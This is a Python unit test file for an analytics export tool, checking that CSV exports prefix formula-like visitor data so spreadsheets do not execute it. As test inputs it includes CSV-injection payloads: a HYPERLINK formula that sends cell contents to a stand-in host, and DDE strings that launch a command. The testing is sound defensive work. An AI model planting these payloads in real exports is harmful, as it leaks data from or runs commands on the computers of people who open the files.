"""Exports must not hand a spreadsheet a formula from visitor data (#159).

GA values (page titles, paths, search terms, event parameters) and Search
Console queries are controlled by whoever visits or searches. A cell like
=HYPERLINK("https://x/?"&A2,"click") would run when the export is opened in
Excel, which is how these files are used.
"""

import csv
import json
import os
import sys
import tempfile
import unittest
import unittest.mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "companion"))

import export  # noqa: E402


class TestNeutralize(unittest.TestCase):

    def test_formula_starts_are_prefixed(self):
        for bad in ('=HYPERLINK("https://x/?"&A2,"x")', "+cmd|' /C calc'!A0",
                    "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)", "\t=1", "\r=1"):
            self.assertEqual(export.neutralize_cell(bad), "'" + bad, bad)

    def test_numbers_stay_numbers(self):
        for ok in ("-12", "-0.5", "+3", "1e5", "-1.2E-3", "123", ".5"):
            self.assertEqual(export.neutralize_cell(ok), ok, ok)

    def test_ordinary_text_and_non_strings_are_untouched(self):
        for ok in ("/admissions/visit", "Home - University", "", None, 5, 2.5):
            self.assertEqual(export.neutralize_cell(ok), ok, repr(ok))


class TestTheWrittenFile(unittest.TestCase):

    def test_the_csv_and_receipt_record_it(self):
        d = tempfile.mkdtemp()
        path = os.path.join(d, "x.csv")
        rows = [['=HYPERLINK("https://x","y")', "-3"], ["/ok", "4"]]
        with unittest.mock.patch.object(export.sessions, "check_writable"):
            receipt = export.write_export(path, ["pageTitle", "sessions"],
                                          rows, {}, preview_rows=5)
        with open(path, newline="", encoding="utf-8") as f:
            got = list(csv.reader(f))
        self.assertEqual(got[1], ['\'=HYPERLINK("https://x","y")', "-3"])
        self.assertEqual(got[2], ["/ok", "4"])
        self.assertEqual(receipt["formula_cells_neutralized"], 1)
        self.assertIn("formula_note", receipt)
        with open(receipt["meta_path"], encoding="utf-8") as f:
            self.assertEqual(json.load(f)["formula_cells_neutralized"], 1)
        self.assertTrue(receipt["preview"][0][0].startswith("'"))


if __name__ == "__main__":
    unittest.main()
